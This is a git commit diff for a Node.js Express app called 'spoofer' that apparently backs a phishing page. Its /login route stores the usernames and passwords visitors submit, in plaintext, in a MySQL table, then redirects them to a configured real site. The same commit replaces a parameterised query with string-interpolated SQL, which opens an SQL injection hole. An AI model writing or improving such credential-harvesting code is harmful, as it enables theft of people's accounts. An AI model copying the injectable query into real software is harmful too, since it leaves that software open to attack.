7eddb162987272cdad1b34654e4e6ad7b25f6ee5
jeremy <jeremy.dosg@gmail.com>
2021-04-06 22:41:07 +0200

    version V1.0.0

--- app.js
+++ app.js
@@ -7,7 +7,6 @@ const cors    = require("cors")
 
 const CONF    = require("./CONF.json")
 
-const console = express()
 const spoofer = express()
 
 ////////////////////////////////////////
@@ -34,40 +33,43 @@ spoofer.use("/static", express.static("public"))
 function login(user)
 {
   return new Promise((resolve, reject)=>{
-    con.query("INSERT INTO user ?", user, (err)=>{
+    con.query(`INSERT INTO user (user, mdp) VALUES ('${user.user}', '${user.mdp}')`, (err)=>{
       if(err){return reject({err: err})}
       resolve(200)
-    }
+    })
   })
 }
 
-////////////////////////////////////////
+////////////////////////////////////////  
 //route
 spoofer.post("/login", async (req, res)=>{
   try{
-    if(!req.body.username || req.body.password)
+    if(!req.body.username || !req.body.password)
       throw {err: "badd request"}
 
     let user = 
     {
       user: req.body.username,
-      mdp: req.body.password,
-      date: new Date(),
+      mdp: req.body.password
     }
 
-    let res = await login(user);
-    if(res === 200)
+    let status = await login(user);
+    if(status === 200)
       res.redirect(CONF.spoofer.url)
   } 
   catch(err)
   {
+    console.log(err)
     err = err.err || "bad request"
     res.redirect("./404")
   }  
 })
 
+spoofer.get("/", (req, res)=>{
+  res.status(200).sendFile(__dirname + "/public/index.html")
+})
 
-spoofer.get("./404", (req, res)=>{
-  res.status(404).sendFile("./public/404.html");
+spoofer.get("/404", (req, res)=>{
+  res.status(404).sendFile(__dirname + "/public/404.html");
 })
 ////////////////////////////////////////
--- conf/create.sql
+++ conf/create.sql
@@ -2,6 +2,5 @@
 create table user(
   id INT AUT_INCREMENT PRIMARY KEY,
   user VARCHAR(255) NOT NULL,
-  mdp VARCHAR(255) NOT NULL,
-  date DATETIME NOT NULL
-)
+  mdp VARCHAR(255) NOT NULL
+);
